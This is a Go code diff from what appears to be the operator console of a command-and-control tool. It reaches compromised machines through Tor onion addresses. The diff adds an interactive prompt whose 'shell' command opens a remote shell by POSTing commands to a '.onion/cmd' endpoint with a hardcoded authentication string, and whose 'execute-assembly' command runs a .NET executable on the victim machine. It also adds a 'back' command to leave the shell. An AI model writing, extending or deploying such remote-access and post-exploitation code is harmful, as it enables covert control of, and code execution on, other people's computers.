@@ -15,6 +15,7 @@ import (
 )
 
 func main() {
+
 	//// This is the code used for establishing a remote shell
 	scanner := bufio.NewScanner(os.Stdin)
 	fmt.Print("Enter the onion ID: ")
@@ -23,13 +24,42 @@ func main() {
 	//fmt.Println("Establishing a shell...")
 	//doShell(onionID)
 
+	// TODO: Establish "HELLO" connection confirmation
+	fmt.Println("\nConnected to " + onionID + "\n")
+
+	for {
+		scanner := bufio.NewScanner(os.Stdin)
+
+		fmt.Print(onionID + "> ")
+		scanner.Scan()
+		cmd := scanner.Text()
+		cmdSlice := strings.Split(cmd, " ")
+		if len(cmdSlice) > 0 {
+			switch cmdSlice[0] {
+			case "shell":
+				doShell(onionID)
+				break
+			case "execute-assembly":
+				//client_assembly_path := "C:\\Users\\Karp\\Downloads\\Program.exe"
+				if len(cmdSlice) > 1 {
+					client_assembly_path := strings.Join(cmdSlice[1:], " ")
+					doExecuteAssembly(onionID, client_assembly_path)
+				} else {
+					fmt.Println("Ex) execute-assembly C:\\Users\\Karp\\Downloads\\Program.exe")
+				}
+
+				break
+			}
+		}
+
+	}
+
 	// This is the code for running execute-assembly
 	//scanner = bufio.NewScanner(os.Stdin)
 	//fmt.Println("Enter the assembly path on the CLIENT:")
 	//scanner.Scan()
 	//client_assembly_path := scanner.Text()
-	client_assembly_path := "C:\\Users\\Karp\\Downloads\\Program.exe"
-	doExecuteAssembly(onionID, client_assembly_path)
+
 }
 
 func doExecuteAssembly(id, client_assembly_path string) {
@@ -135,6 +165,11 @@ func doShell(id string) {
 		scanner := bufio.NewScanner(os.Stdin)
 		scanner.Scan()
 		cmd := scanner.Text()
+
+		if cmd == "back" {
+			return
+		}
+
 		url := "http://" + id + ".onion/cmd"
 		var query = []byte(`adsfasdfbadauthentication123asfdasdf`)
 		req, err := http.NewRequest("POST", url, bytes.NewBuffer(query))
